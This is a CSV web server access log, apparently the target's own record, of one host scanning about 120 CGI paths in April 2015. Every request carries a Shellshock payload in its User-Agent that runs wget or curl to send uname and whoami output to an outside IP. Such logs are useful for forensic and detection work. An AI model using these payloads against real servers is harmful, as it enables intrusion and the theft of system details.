"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"180.234.44.185","-","2015-04-12 19:31:13","GMT-0700","GET","/cgi-bin/ezshopper3/loadpage.cgi",404,553,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:15","GMT-0700","GET","/cgi-bin/ezshopper/search.cgi",404,550,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:15","GMT-0700","GET","/cgi-bin/ezshopper/loadpage.cgi",404,552,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:16","GMT-0700","GET","/cgi-bin/ezman.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:17","GMT-0700","GET","/cgi-bin/ezboard.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:18","GMT-0700","GET","/cgi-bin/ezadmin.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:18","GMT-0700","GET","/cgi-bin/environ.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:19","GMT-0700","GET","/cgi-bin/enter.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:20","GMT-0700","GET","/cgi-bin/emumail/emumail.cgi",404,549,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:21","GMT-0700","GET","/cgi-bin/emumail.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:21","GMT-0700","GET","/cgi-bin/emu/html/emumail.cgi",404,550,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:22","GMT-0700","GET","/cgi-bin/download.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:24","GMT-0700","GET","/cgi-bin/directorypro.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:25","GMT-0700","GET","/cgi-bin/dig.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:25","GMT-0700","GET","/cgi-bin/diagnose.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:26","GMT-0700","GET","/cgi-bin/dfire.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:27","GMT-0700","GET","/cgi-bin/dcforum.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:29","GMT-0700","GET","/cgi-bin/db_manager.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:30","GMT-0700","GET","/cgi-bin/day5datanotifier.cgi",404,550,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:31","GMT-0700","GET","/cgi-bin/day5datacopier.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:31","GMT-0700","GET","/cgi-bin/cvsqueryform.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:32","GMT-0700","GET","/cgi-bin/cvsquery.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:33","GMT-0700","GET","/cgi-bin/cvslog.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:34","GMT-0700","GET","/cgi-bin/cvsblame.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:34","GMT-0700","GET","/cgi-bin/csv_db.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:35","GMT-0700","GET","/cgi-bin/csSearch.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:36","GMT-0700","GET","/cgi-bin/csPassword/csPassword.cgi",404,555,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:37","GMT-0700","GET","/cgi-bin/csPassword.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:37","GMT-0700","GET","/cgi-bin/csNewsPro.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:38","GMT-0700","GET","/cgi-bin/csNews.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:39","GMT-0700","GET","/cgi-bin/CSMailto/CSMailto.cgi",404,551,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:40","GMT-0700","GET","/cgi-bin/CSMailto.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:42","GMT-0700","GET","/cgi-bin/csGuestBook.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:42","GMT-0700","GET","/cgi-bin/csChatRBox.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:43","GMT-0700","GET","/cgi-bin/Count.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:44","GMT-0700","GET","/cgi-bin/compatible.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:46","GMT-0700","GET","/cgi-bin/commerce.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:48","GMT-0700","GET","/cgi-bin/classifieds/index.cgi",404,551,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:49","GMT-0700","GET","/cgi-bin/classifieds/classifieds.cgi",404,557,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:50","GMT-0700","GET","/cgi-bin/classifieds.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:51","GMT-0700","GET","/cgi-bin/classified.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:51","GMT-0700","GET","/cgi-bin/cgi_process",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:52","GMT-0700","GET","/cgi-bin/cgi.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:53","GMT-0700","GET","/cgi-bin/cgforum.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:54","GMT-0700","GET","/cgi-bin/ccvsblame.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:54","GMT-0700","GET","/cgi-bin/cbmc/forums.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:55","GMT-0700","GET","/cgi-bin/cartmanager.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:56","GMT-0700","GET","/cgi-bin/calendar/index.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:57","GMT-0700","GET","/cgi-bin/cachemgr.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:57","GMT-0700","GET","/cgi-bin/cached_feed.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:58","GMT-0700","GET","/cgi-bin/c_download.cgi",404,544,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:31:59","GMT-0700","GET","/cgi-bin/bulk/bulk.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:00","GMT-0700","GET","/cgi-bin/build.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:02","GMT-0700","GET","/cgi-bin/bsguest.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:03","GMT-0700","GET","/cgi-bin/boozt/admin/index.cgi",404,551,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:04","GMT-0700","GET","/cgi-bin/book.cgi",404,538,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:06","GMT-0700","GET","/cgi-bin/blog/mt-load.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:07","GMT-0700","GET","/cgi-bin/blog/mt-check.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:08","GMT-0700","GET","/cgi-bin/bizdb1-search.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:08","GMT-0700","GET","/cgi-bin/bigconf.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:09","GMT-0700","GET","/cgi-bin/bbs_forum.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:10","GMT-0700","GET","/cgi-bin/BBS/bbs_forum.cgi",404,547,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:16","GMT-0700","GET","/cgi-bin/bannereditor.cgi",404,546,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:17","GMT-0700","GET","/cgi-bin/banner.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:18","GMT-0700","GET","/cgi-bin/badmin.cgi",404,540,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:19","GMT-0700","GET","/cgi-bin/axs.cgi",404,537,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:19","GMT-0700","GET","/cgi-bin/ax.cgi",404,536,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:20","GMT-0700","GET","/cgi-bin/ax-admin.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:21","GMT-0700","GET","/cgi-bin/auktion.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:22","GMT-0700","GET","/cgi-bin/auction/auction.cgi",404,549,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:23","GMT-0700","GET","/cgi-bin/AT-generate.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:23","GMT-0700","GET","/cgi-bin/AT-admin.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:24","GMT-0700","GET","/cgi-bin/astrocam.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:25","GMT-0700","GET","/cgi-bin/architext_query.cgi",404,549,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:26","GMT-0700","GET","/cgi-bin/AnyBoard.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:26","GMT-0700","GET","/cgi-bin/alienform.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:27","GMT-0700","GET","/cgi-bin/aglimpse.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:28","GMT-0700","GET","/cgi-bin/af.cgi",404,536,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:29","GMT-0700","GET","/cgi-bin/adminwww.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:29","GMT-0700","GET","/cgi-bin/adminhot.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:30","GMT-0700","GET","/cgi-bin/admin/setup.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:31","GMT-0700","GET","/cgi-bin/admin/admin.cgi",404,545,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:32","GMT-0700","GET","/cgi-bin/admin.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:36","GMT-0700","GET","/cgi-bin/a1stats/a1disp4.cgi",404,549,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:38","GMT-0700","GET","/cgi-bin/a1stats/a1disp3.cgi",404,549,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:38","GMT-0700","GET","/cgi-bin/a1disp3.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:39","GMT-0700","GET","/cgi-bin/14all.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:40","GMT-0700","GET","/cgi-bin/14all-1.1.cgi",404,543,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:41","GMT-0700","GET","/cgi-bin/.namazu.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:41","GMT-0700","GET","/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi",404,565,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:42","GMT-0700","GET","/cgi-bin/.cobalt/message/message.cgi",404,557,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:43","GMT-0700","GET","/cgi-bin/.cobalt/alert/service.cgi",404,555,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:45","GMT-0700","GET","/ccbill/whereami.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:45","GMT-0700","GET","/catalog/index.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:46","GMT-0700","GET","/cartcart.cgi",404,534,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:47","GMT-0700","GET","/cart.cgi",404,530,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:48","GMT-0700","GET","/bigconf.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:48","GMT-0700","GET","/bandwidth/index.cgi",404,541,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:49","GMT-0700","GET","/b2-include/b2edit.showposts.php",404,553,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:50","GMT-0700","GET","/axis-cgi/buffer/command.cgi",404,549,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:51","GMT-0700","GET","/apps/web/vs_diag.cgi",404,542,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:52","GMT-0700","GET","/analyse.cgi",404,533,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:52","GMT-0700","GET","/aktivate/cgi-bin/catgy.cgi",404,548,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:54","GMT-0700","GET","/agora.cgi",404,531,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:54","GMT-0700","GET","/administrator.cgi",404,539,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:55","GMT-0700","GET","/admin.cgi",404,531,"http://google.com","() { :; }; wget -qO - http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:58","GMT-0700","GET","/",200,600,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:32:59","GMT-0700","GET","/cgi-bin/",403,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:00","GMT-0700","GET","/cgi-sys/",404,530,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:00","GMT-0700","GET","/cgi-sys/entropysearch.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:01","GMT-0700","GET","/cgi-sys/FormMail-clone.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:02","GMT-0700","GET","/cgi-sys/suspendedpage.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:03","GMT-0700","GET","/xul/",404,526,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:04","GMT-0700","GET","/cgi-bin/status",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:05","GMT-0700","GET","/tmUnblock.cgi",404,535,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:05","GMT-0700","GET","/gitweb/",404,529,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:06","GMT-0700","GET","/gitweb.cgi",404,532,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:07","GMT-0700","GET","/gitweb/gitweb.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:08","GMT-0700","GET","/cgi-bin/",403,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:08","GMT-0700","GET","/cgi-bin/php",404,533,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:09","GMT-0700","GET","/cgi-bin/php5",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:10","GMT-0700","GET","/cgi-bin/php4",404,534,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:11","GMT-0700","GET","/cgi-bin/php-cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:12","GMT-0700","GET","/cgi-bin/php.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:13","GMT-0700","GET","/cgi-bin/firmwarecfg",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:14","GMT-0700","GET","/cgi-bin/%2f/admin.html",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:33:14","GMT-0700","GET","/cgi-bin/admin.html",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
